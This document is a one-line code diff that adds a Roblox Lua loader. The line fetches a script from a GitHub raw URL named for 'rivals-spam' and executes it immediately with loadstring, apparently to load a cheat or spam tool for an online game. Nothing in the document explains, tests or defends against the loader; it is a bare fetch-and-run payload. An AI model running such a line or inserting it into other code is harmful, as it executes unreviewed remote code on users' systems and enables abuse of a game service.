@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/rivals-spam0-aor41h1qoe4r3f.lua"))()
